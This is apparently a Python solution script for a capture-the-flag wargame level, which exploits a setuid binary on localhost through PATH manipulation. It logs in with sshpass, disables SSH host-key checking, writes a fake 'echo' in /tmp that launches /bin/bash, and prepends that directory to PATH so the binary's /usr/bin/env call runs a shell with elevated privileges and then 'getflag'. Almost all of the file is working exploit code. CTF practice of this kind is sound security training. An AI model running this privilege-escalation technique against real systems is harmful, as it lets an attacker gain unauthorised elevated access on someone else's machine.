"""Level03 - PATH Manipulation Privilege Escalation"""

import subprocess
import sys


def ssh_cmd(host, port, user, pwd, cmd):
    """Execute SSH command via sshpass."""
    try:
        result = subprocess.run(
            [
                "sshpass",
                "-p",
                pwd,
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-p",
                str(port),
                f"{user}@{host}",
                cmd,
            ],
            capture_output=True,
            text=True,
            timeout=10,
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Timeout"
    except FileNotFoundError:
        return -1, "", "sshpass not found: apt-get install sshpass"
    except Exception as e:
        return -1, "", str(e)


def exploit(host, port, user, pwd, binary="~/level03"):
    """Execute PATH manipulation exploit against setuid binary."""
    print(f"[*] Level03 PATH Manipulation Exploit\n")
    print(f"    Target: {user}@{host}:{port}\n")

    steps = [
        ("Creating directory", "mkdir -p /tmp/level03_exploit"),
        (
            "Creating malicious echo",
            "echo '#!/bin/bash' > /tmp/level03_exploit/echo && echo '/bin/bash' >> /tmp/level03_exploit/echo && chmod +x /tmp/level03_exploit/echo",
        ),
        (
            "Executing exploit",
            f"export PATH=/tmp/level03_exploit:$PATH && {binary} <<< 'getflag'",
        ),
    ]

    for step, command in steps:
        print(f"[*] {step}...")
        code, out, err = ssh_cmd(host, port, user, pwd, command)
        if code != 0 and step != "Executing exploit":
            print(f"[!] Failed: {err}")
            return False, ""
        if step == "Executing exploit":
            break

    if "token" in out.lower():
        print(f"[+] Success!\n{out}")
        for line in out.split("\n"):
            if "token" in line.lower():
                return True, line.split(":")[-1].strip()
        return True, ""
    else:
        print(f"[!] Failed\nOutput: {out}\nError: {err}")
        return False, ""


def main():
    print("Level03 Remote Exploit\n")
    try:
        with open("level02/flag") as f:
            pwd = f.read().strip()
    except Exception:
        print("[!] Could not read level02/flag")
        sys.exit(1)
    success, token = exploit("localhost", 4242, "level03", pwd)

    if success:
        print("\n[SUMMARY]")
        print(f"  Vulnerability: PATH manipulation in setuid binary")
        print(f"  Attack: Malicious 'echo' in PATH hijacks /usr/bin/env call")
        print(f"  Result: Executed with flag03 privileges\n")
        print(f"[ANSWER]")
        print(f"  Level03 Token: {token if token else 'Retrieved via getflag'}")
    else:
        print("[!] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
